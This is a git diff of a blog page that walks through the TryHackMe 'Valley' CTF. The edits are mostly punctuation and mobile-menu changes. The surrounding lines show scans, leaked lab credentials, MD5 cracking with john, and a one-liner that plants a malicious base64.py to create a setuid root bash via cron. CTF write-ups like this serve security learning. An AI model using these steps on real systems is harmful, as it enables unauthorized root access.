@@ -7,10 +7,10 @@
 <meta name="robots" content="index, follow">
 <title>Valley | Jenn Shagrin</title>
 <meta name="keywords" content="">
-<meta name="description" content="TryHackMe CTF — credential exposure chain, PCAP analysis, UPX binary analysis, and Python library hijack via cron.">
+<meta name="description" content="TryHackMe CTF: credential exposure chain, PCAP analysis, UPX binary analysis, and Python library hijack via cron.">
 <meta name="author" content="">
 <link rel="canonical" href="https://jennshaggy.github.io/valley-ctf.html">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.40a236105b83b1f05a55d0a48876965b59b1d8f81f351041e484dc5905b375dc.css" rel="preload stylesheet" as="style">
     <link rel="stylesheet" href="/assets/css/accents.css">
 <link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
@@ -68,15 +68,18 @@
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/mobile-nav.css">
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&amp;family=Source+Code+Pro:wght@400;500;600&amp;family=Tomorrow:wght@500;600;700&amp;display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/site-ui-lab.css">
 <meta property="og:url" content="https://jennshaggy.github.io/valley-ctf.html">
 <meta property="og:site_name" content="Jenn Shagrin">
 <meta property="og:title" content="Valley">
-<meta property="og:description" content="TryHackMe CTF — credential exposure chain, PCAP analysis, UPX binary analysis, and Python library hijack via cron.">
+<meta property="og:description" content="TryHackMe CTF: credential exposure chain, PCAP analysis, UPX binary analysis, and Python library hijack via cron.">
 <meta property="og:locale" content="en-us">
 <meta property="og:type" content="article">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Valley">
-<meta name="twitter:description" content="TryHackMe CTF — credential exposure chain, PCAP analysis, UPX binary analysis, and Python library hijack via cron.">
+<meta name="twitter:description" content="TryHackMe CTF: credential exposure chain, PCAP analysis, UPX binary analysis, and Python library hijack via cron.">
 </head>
 
 <body id="top">
@@ -105,6 +108,7 @@
                         <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                     </svg>
                 </button>
+                <button id="menu-toggle" type="button" aria-expanded="false" aria-controls="menu"><span class="menu-toggle-label">Menu</span><span class="menu-toggle-icon" aria-hidden="true"><span></span><span></span></span></button>
             </div>
         </div>
         <ul id="menu">
@@ -134,7 +138,7 @@
                 </a>
             </li>
             <li>
-                <a href="/ai-security/" title="AI Security" target="_blank" rel="noopener noreferrer">
+                <a href="/ai-security/" title="AI Security">
                     <span>AI Security</span>
                 </a>
             </li>
@@ -143,10 +147,10 @@
 </header>
 
 <main class="main">
-<article class="post-single">
+<article class="post-single technical-writeup">
   <header class="post-header">
     <h1 class="post-title entry-hint-parent">Valley</h1>
-    <div class="post-description">TryHackMe CTF &mdash; credential exposure chain, PCAP analysis, UPX binary analysis, and Python library hijack via cron.</div>
+    <div class="post-description">TryHackMe CTF: credential exposure chain, PCAP analysis, UPX binary analysis, and Python library hijack via cron.</div>
   </header>
 
   <div class="post-content">
@@ -157,18 +161,18 @@
 
 <h2>Initial Enumeration</h2>
 
-<p>Full port scan first — always. Non-standard ports don't show up in default scans.</p>
+<p>Full port scan first, always. Non-standard ports don't show up in default scans.</p>
 
 <pre><code>nmap -p- --min-rate 5000 -T4 10.146.163.47 -oN valley_allports.txt
 nmap -sC -sV -p 22,80,37370 -oN valley_services.txt 10.146.163.47</code></pre>
 
-<p>SSH on 22, Apache 2.4.41 on 80, vsFTPd 3.0.3 on 37370. The FTP port needs credentials — filed away.</p>
+<p>SSH on 22, Apache 2.4.41 on 80, vsFTPd 3.0.3 on 37370. The FTP port needs credentials. Filed away.</p>
 
 <img src="/images/valley/Screenshot 2026-04-01 at 7.36.52 AM.png" alt="Full port scan revealing non-standard FTP on 37370" style="max-width:100%;margin:1rem 0;">
 
 <img src="/images/valley/Screenshot 2026-04-01 at 7.44.42 AM.png" alt="Service scan confirming vsFTPd 3.0.3 on 37370 and Apache on 80" style="max-width:100%;margin:1rem 0;">
 
-<p>The web app is a photography portfolio. Two buttons: View Gallery and View Pricing. Page source references <code>/js/art.js</code> — a node.js ascii-art package with a known command injection vulnerability. It 404s here and doesn't factor into this chain, but worth noting that I checked.</p>
+<p>The web app is a photography portfolio. Two buttons: View Gallery and View Pricing. Page source references <code>/js/art.js</code>, a node.js ascii-art package with a known command injection vulnerability. It 404s here and doesn't factor into this chain, but worth noting that I checked.</p>
 
 <img src="/images/valley/Screenshot 2026-04-01 at 7.45.13 AM.png" alt="Valley Photo Co. landing page" style="max-width:100%;margin:1rem 0;">
 
@@ -186,7 +190,7 @@ nmap -sC -sV -p 22,80,37370 -oN valley_services.txt 10.146.163.47</code></pre>
 
 <hr>
 
-<h2>Information Disclosure &mdash; /static/00</h2>
+<h2>Information Disclosure: /static/00</h2>
 
 <p>Dev notes sitting in a numbered static slot the gallery never references:</p>
 
@@ -220,7 +224,7 @@ nmap -sC -sV -p 22,80,37370 -oN valley_services.txt 10.146.163.47</code></pre>
 
 <hr>
 
-<h2>FTP Access &mdash; PCAP Retrieval</h2>
+<h2>FTP Access: PCAP Retrieval</h2>
 
 <p>FTP opens immediately with the JS credentials:</p>
 
@@ -239,13 +243,13 @@ psw=ph0t0s1234</code></pre>
 
 <hr>
 
-<h2>Initial Access &mdash; SSH as valleyDev</h2>
+<h2>Initial Access: SSH as valleyDev</h2>
 
 <pre><code>ssh valleyDev@10.146.163.47</code></pre>
 
 <img src="/images/valley/Screenshot 2026-04-01 at 8.38.18 AM.png" alt="SSH access confirmed as valleyDev" style="max-width:100%;margin:1rem 0;">
 
-<p>User flag retrieved. Standard privesc enumeration: no sudo rights for valleyDev, one custom cron entry running <code>python3 /photos/script/photosEncrypt.py</code> as root every minute. The script imports <code>base64</code> — potentially hijackable if a writable path exists earlier in Python's search order. But valleyDev isn't in the <code>valley</code> group that owns the photos directory. Need to lateral move first.</p>
+<p>User flag retrieved. Standard privesc enumeration: no sudo rights for valleyDev, one custom cron entry running <code>python3 /photos/script/photosEncrypt.py</code> as root every minute. The script imports <code>base64</code>, potentially hijackable if a writable path exists earlier in Python's search order. But valleyDev isn't in the <code>valley</code> group that owns the photos directory. Need to lateral move first.</p>
 
 <img src="/images/valley/Screenshot 2026-04-01 at 8.47.04 AM.png" alt="User flag retrieved" style="max-width:100%;margin:1rem 0;">
 
@@ -253,13 +257,13 @@ psw=ph0t0s1234</code></pre>
 
 <img src="/images/valley/Screenshot 2026-04-01 at 8.53.39 AM.png" alt="photosEncrypt.py source importing base64" style="max-width:100%;margin:1rem 0;">
 
-<img src="/images/valley/Screenshot 2026-04-01 at 8.54.55 AM.png" alt="/photos/ directory owned by valley group — valleyDev has no access" style="max-width:100%;margin:1rem 0;">
+<img src="/images/valley/Screenshot 2026-04-01 at 8.54.55 AM.png" alt="/photos/ directory owned by valley group; valleyDev has no access" style="max-width:100%;margin:1rem 0;">
 
 <hr>
 
-<h2>Lateral Movement &mdash; valleyAuthenticator Binary</h2>
+<h2>Lateral Movement: valleyAuthenticator Binary</h2>
 
-<p><code>/home/</code> has an unexpected file: <code>valleyAuthenticator</code>, executable by everyone. Running it prompts for credentials — known ones fail. The real password is baked into the binary. Pull it locally:</p>
+<p><code>/home/</code> has an unexpected file: <code>valleyAuthenticator</code>, executable by everyone. Running it prompts for credentials; known ones fail. The real password is baked into the binary. Pull it locally:</p>
 
 <pre><code>scp valleyDev@10.146.163.47:/home/valleyAuthenticator ~/valleyAuthenticator</code></pre>
 
@@ -267,12 +271,12 @@ psw=ph0t0s1234</code></pre>
 
 <img src="/images/valley/Screenshot 2026-04-01 at 9.29.12 AM.png" alt="scp pulling valleyAuthenticator to local machine" style="max-width:100%;margin:1rem 0;">
 
-<p>Initial <code>strings</code> output is garbage — UPX packed. Unpack first:</p>
+<p>Initial <code>strings</code> output is garbage. UPX packed. Unpack first:</p>
 
 <pre><code>upx -d ~/valleyAuthenticator -o ~/valleyAuthenticator_unpacked
 strings ~/valleyAuthenticator_unpacked | grep -B5 "Welcome"</code></pre>
 
-<img src="/images/valley/Screenshot 2026-04-01 at 9.31.07 AM.png" alt="UPX unpack — binary decompresses from 749KB to 2.2MB" style="max-width:100%;margin:1rem 0;">
+<img src="/images/valley/Screenshot 2026-04-01 at 9.31.07 AM.png" alt="UPX unpack: binary decompresses from 749KB to 2.2MB" style="max-width:100%;margin:1rem 0;">
 
 <p>Two MD5 hashes appear directly above the authentication strings:</p>
 
@@ -287,18 +291,18 @@ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt</co
 
 <p>John returns <code>valley</code> and <code>liberty123</code>.</p>
 
-<img src="/images/valley/Screenshot 2026-04-01 at 9.38.42 AM.png" alt="John cracking both MD5 hashes — valley and liberty123" style="max-width:100%;margin:1rem 0;">
+<img src="/images/valley/Screenshot 2026-04-01 at 9.38.42 AM.png" alt="John cracking both MD5 hashes: valley and liberty123" style="max-width:100%;margin:1rem 0;">
 
 <pre><code>su valley
 # password: liberty123</code></pre>
 
-<img src="/images/valley/Screenshot 2026-04-01 at 9.41.36 AM.png" alt="su valley confirmed — valleyAdmin group membership visible" style="max-width:100%;margin:1rem 0;">
+<img src="/images/valley/Screenshot 2026-04-01 at 9.41.36 AM.png" alt="su valley confirmed; valleyAdmin group membership visible" style="max-width:100%;margin:1rem 0;">
 
 <p><code>valleyAdmin</code> group. That's what was missing.</p>
 
 <hr>
 
-<h2>Privilege Escalation &mdash; Python Library Hijack via Cron</h2>
+<h2>Privilege Escalation: Python Library Hijack via Cron</h2>
 
 <p>Python's module search order checks <code>sys.path</code> sequentially. If a malicious module exists earlier in that path than the real one, it gets imported instead. As <code>valley</code>, check whether <code>valleyAdmin</code> has write access to any path Python searches:</p>
 
@@ -309,7 +313,7 @@ ls -la /usr/lib/python3.8/</code></pre>
 
 <pre><code>echo 'import os; os.system("cp /bin/bash /tmp/rootbash &amp;&amp; chmod +s /tmp/rootbash")' > /usr/lib/python3.8/base64.py</code></pre>
 
-<img src="/images/valley/Screenshot 2026-04-01 at 9.42.46 AM.png" alt="/usr/lib/python3.8/ writable by valleyAdmin — malicious base64.py planted" style="max-width:100%;margin:1rem 0;">
+<img src="/images/valley/Screenshot 2026-04-01 at 9.42.46 AM.png" alt="/usr/lib/python3.8/ writable by valleyAdmin; malicious base64.py planted" style="max-width:100%;margin:1rem 0;">
 
 <pre><code>watch -n 5 ls -la /tmp/rootbash</code></pre>
 
@@ -410,6 +414,9 @@ cat /root/root.txt</code></pre>
             localStorage.setItem("pref-theme", 'dark');
         }
     })
+</script>
+<script>
+(()=>{const t=document.getElementById("menu-toggle"),m=document.getElementById("menu");if(!t||!m)return;document.documentElement.classList.add("js-menu-ready");const close=(focus=false)=>{t.setAttribute("aria-expanded","false");m.classList.remove("menu-open");if(focus)t.focus()};t.addEventListener("click",()=>{const open=t.getAttribute("aria-expanded")==="true";t.setAttribute("aria-expanded",String(!open));m.classList.toggle("menu-open",!open)});m.addEventListener("click",e=>{if(e.target.closest("a"))close()});document.addEventListener("click",e=>{if(t.getAttribute("aria-expanded")==="true"&&!m.contains(e.target)&&!t.contains(e.target))close()});document.addEventListener("keydown",e=>{if(e.key==="Escape"&&t.getAttribute("aria-expanded")==="true")close(true)});window.matchMedia("(min-width: 769px)").addEventListener("change",e=>{if(e.matches)close()})})();
 </script>
 <!-- Cloudflare Web Analytics --><script type='module' src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "d29793993e20413c866dbc989486b294"}'></script><!-- End Cloudflare Web Analytics -->
 </body>
